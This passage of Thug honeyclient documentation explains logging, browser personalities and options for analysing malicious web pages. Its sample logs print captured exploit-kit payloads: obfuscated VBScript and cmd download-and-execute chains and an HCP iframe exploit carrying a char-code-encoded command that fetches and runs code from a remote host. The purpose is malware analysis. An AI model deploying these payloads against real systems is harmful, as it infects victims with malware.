drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">144</span> Jul  <span class="m">2</span> 19:15 html

./text/html:
total 72K
-rw-r--r-- <span class="m">1</span> buffer buffer 68K Jul  <span class="m">2</span> 19:15 95ee609e6e3b69c2d9e68f34ff4a4335
-rw-r--r-- <span class="m">1</span> buffer buffer <span class="m">878</span> Jul  <span class="m">2</span> 19:15 d26b9b1a1f667004945d1d000cf4f19e
</pre></div>
</div>
<p>If the MAEC 1.1 logging mode is enabled, the file <em>analysis.xml</em> contains the URL analysis
results saved in MAEC 1.1 format (please refer to <a class="reference external" href="http://maec.mitre.org">http://maec.mitre.org</a> for additional details).
Please note that all the files downloaded during the URL analysis are saved in this directory
based on their Content-Type for convenience (if the File logging mode is enabled).</p>
<p>Moreover if MongoDB is installed the information you can see in this directory are saved in the
database instance too. Let&#8217;s take a deeper look using pymongo (you can get the same result by
using the MongoDB client <em>mongo</em>).</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~/thug/src $ python
Python 2.7.3 (default, Jun 12 2012, 10:22:50)
[GCC 4.5.3] on linux2
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; import pymongo
&gt;&gt;&gt; connection = pymongo.Connection()
&gt;&gt;&gt; db = connection.thug
&gt;&gt;&gt; url = db.urls.find_one({&#39;url&#39; : &#39;http://[omitted]/main.php?page=8c6c59becaa0da07&#39;})
&gt;&gt;&gt; url
{u&#39;url&#39;: u&#39;http://[omitted]/main.php?page=8c6c59becaa0da07&#39;, u&#39;_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;)}
&gt;&gt;&gt; for sample in db.samples.find({&#39;url_id&#39;: url[&#39;_id&#39;]}):
...     print sample
...

{u&#39;_id&#39;: ObjectId(&#39;4ff1b8f4e732795951000001&#39;), u&#39;url&#39;: u&#39;http://[omitted]/Ryp.jar&#39;, u&#39;type&#39;: u&#39;JAR&#39;, u&#39;sha1&#39;: u&#39;5fffd5cc4a372a6c2a826a850a955cb6a4042272&#39;, u&#39;url_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;), u&#39;data&#39;: u&#39;[skipped]&#39;, u&#39;md5&#39;: u&#39;e3639fde6ddf7fd0182fff9757143ff2&#39;}
{u&#39;_id&#39;: ObjectId(&#39;4ff1b8f7e732795951000002&#39;), u&#39;url&#39;: u&#39;http://[omitted]/w.php?f=b081d&amp;e=2&#39;, u&#39;type&#39;: u&#39;PE&#39;, u&#39;sha1&#39;: u&#39;1445e7d338d0d7c20f1d2329f4d653cce1562cc8&#39;, u&#39;url_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;), u&#39;data&#39;:  u&#39;[skipped]&#39;, u&#39;md5&#39;: u&#39;d328b5a123bce1c0d20d763ad745303a&#39;}
[..]
&gt;&gt;&gt; for event in db.events.find({&#39;url_id&#39;: url[&#39;_id&#39;]}):
...     print event
...
{u&#39;MAEC&#39;: u&#39;&lt;MAEC_Bundle xmlns:ns1=&quot;http://xml/metadataSharing.xsd&quot; xmlns=&quot;http://maec.mitre.org/XMLSchema/maec-core-1&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd&quot; id=&quot;maec:thug:bnd:1&quot; schema_version=&quot;1.100000&quot;&gt;
[..]
</pre></div>
</div>
</div>
<div class="section" id="browser-personality">
<h2>Browser personality<a class="headerlink" href="#browser-personality" title="Permalink to this headline">¶</a></h2>
<p>If no additional option (other than the URL) is provided the emulated browser personality is
Internet Explorer 6.0 on Windows XP platform. This choice is usually quite interesting for
the really simple reason a lot of exploit kits out there try to exploit a vulnerability in Microsoft
Data Access Components (MDAC) which allows remote code execution if facing such personality.
Thug emulates perfectly this exploit thus allowing to quite easily download a malicious
executable for later analysis.</p>
<p>If there&#8217;s the need to test the content that would be served while using a different browser
personality the <em>-u (&#8211;useragent)</em> option should be used. In the following example, the
option <em>-u winxpie80</em> is used in order to test the content served when surfing the same
page with Internet Explorer 8.0 on Windows XP platform.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~ $ thug -u winxpie80 <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span>2012-07-02 19:21:00<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:21:00<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span>2012-07-02 19:21:00<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span>2012-07-02 19:21:02<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> Saving applet Ryp.jar
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-07-02 19:21:03<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap1.php?f<span class="o">=</span>b081d --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
<span class="o">[</span>2012-07-02 19:21:05<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:21:05<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
<span class="o">[</span>2012-07-02 19:21:05<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
<span class="o">[</span>2012-07-02 19:21:05<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; 64
<span class="o">[</span>2012-07-02 19:21:05<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe

<span class="o">[</span>2012-07-02 19:21:05<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Code:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
<span class="o">[</span>2012-07-02 19:21:05<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span>0
<span class="o">[</span>2012-07-02 19:21:06<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:21:06<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 1<span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span>2012-07-02 19:21:06<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage 2<span class="o">]</span> Code:
<span class="nv">w</span><span class="o">=</span>3000:x<span class="o">=</span>200:y<span class="o">=</span>1:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span>2<span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On Error resume next
c.open OT, a, z:c.send<span class="o">()</span>
If c.Status <span class="o">=</span> x Then
d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span>3-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:21:09] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:11] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:21:11] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span>0<span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span>56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;iframe height=&quot;</span>0<span class="s2">&quot; src=&quot;</span>hcp://services/search?query<span class="o">=</span>anything<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">topic</span><span class="o">=</span>hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr<span class="o">=</span><span class="p">&amp;</span>lt<span class="p">;</span>script defer<span class="p">&amp;</span>gt<span class="p">;</span>eval<span class="o">(</span>Run<span class="o">(</span>String.fromCharCode<span class="o">(</span>99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101<span class="o">)))</span><span class="p">;&amp;</span>lt<span class="p">;</span>/script<span class="p">&amp;</span>gt<span class="p">;</span><span class="s2">&quot; width=&quot;</span>0<span class="s2">&quot;&gt;&lt;/iframe&gt;</span>
<span class="s2">[2012-07-02 19:21:11] [iframe redirection] http://[omitted]/main.php?page=8c6c59becaa0da07 -&gt; hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&lt;script defer&gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&lt;/script&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:11] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:21:17] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:17] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:21:17] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:17] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span>0<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:17] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span>10<span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span>10<span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:21:17] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:21:18] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:18] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
<p>It&#8217;s quite simple to realize that the exploit for the Microsoft Data Access Components (MDAC)
vulnerability is not served in this case.</p>
</div>
<div class="section" id="dom-events-handling">
<h2>DOM Events Handling<a class="headerlink" href="#dom-events-handling" title="Permalink to this headline">¶</a></h2>
<p>A useful option is the -e (&#8211;events) option which allows you to specify which DOM events should
be handled by Thug. By default <cite>load</cite> and <cite>mousemove</cite> events are always handled but you can add
other ones with this option. Using this option is quite simple. All you need to do is to specify
a comma-separated list of events to handle as shown below.</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~ $ thug -e click,mouseover URL
</pre></div>
</div>
<p>In this example, the DOM events <cite>load</cite>, <cite>mousemove</cite>, <cite>click</cite> and <cite>mouseover</cite> will be handled by
Thug while all the other ones will be ignored.</p>
</div>
<div class="section" id="adobe-acrobat-reader">
<h2>Adobe Acrobat Reader<a class="headerlink" href="#adobe-acrobat-reader" title="Permalink to this headline">¶</a></h2>
<p>Taking a look at the available options you can see the -A (&#8211;adobepdf) option which is quite
useful for getting different PDF exploits which target different version of Adobe Acrobat
Reader. This happens because exploit kits usually serve PDF files which exploit specific
vulnerabilities basing on the Adobe Acrobat Reader version. Let&#8217;s take a look at what happens if
we try to analyze the same page with Adobe Acrobat Reader 8.1.0 instead of 9.1.0 (which is
the default one).</p>
<div class="highlight-sh"><div class="highlight"><pre><span></span>~ $ thug -A 8.1.0 <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span>2012-07-02 19:18:00<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:00<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span>2012-07-02 19:18:00<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span>2012-07-02 19:18:03<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:03<span class="o">]</span> Saving applet Ryp.jar
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>adodb.stream<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> ActiveXObject: adodb.stream
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>Shell.Application<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> ActiveXObject: shell.application
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> <span class="o">[</span>Microsoft MDAC RDS.Dataspace ActiveX<span class="o">]</span> CreateObject <span class="o">(</span>msxml2.XMLHTTP<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span>2012-07-02 19:18:04<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Fetching from URL http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span>2
<span class="o">[</span>2012-07-02 19:18:07<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/w.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span>2012-07-02 19:18:08<span class="o">]</span> <span class="o">[</span>Microsoft XMLHTTP ActiveX<span class="o">]</span> Saving File: d328b5a123bce1c0d20d763ad745303a
